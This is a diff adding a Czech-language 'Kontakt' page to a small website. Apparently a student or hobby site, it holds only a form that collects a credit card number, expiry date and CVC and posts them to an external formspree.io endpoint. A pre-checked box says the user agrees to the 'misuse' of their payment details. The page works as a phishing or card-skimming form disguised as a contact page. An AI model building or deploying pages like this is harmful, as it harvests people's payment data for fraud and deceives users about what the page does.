@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Kontakt</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div id="custom-cursor"></div>
+<nav>
+    <a href="index.html">Domů</a>
+    <a href="galerie.html">Galerie</a>
+    <a href="rozvrh.html">Rozvrh</a>
+    <a href="kontakt.html">Kontakt</a>
+</nav>
+    <main>
+        <form
+                action="https://formspree.io/f/mljgbzor"
+                method="POST"
+        >
+
+
+            <label for="Number">Číslo kreditní karty</label>
+            <input type="number" id="Number" name="nuber" maxlength="16">
+            <label for="exp">Datum expirace</label>
+            <input type="date" id="exp" name="exp">
+            <label for="cvc">CVC</label>
+            <input type="password" id="cvc" name="cvc" maxlength="3"><br>
+            <label for="Souhlas">Souhlasím se znežitím svých platebních údajů</label>
+            <input type="checkbox" id="Souhlas" name="souhlas" checked="checked"><br>
+            <br>
+            <button type="submit">Odeslat</button>
+
+
+        </form>
+    </main>
+<script src="script.js"></script>
+</body>
+</html>
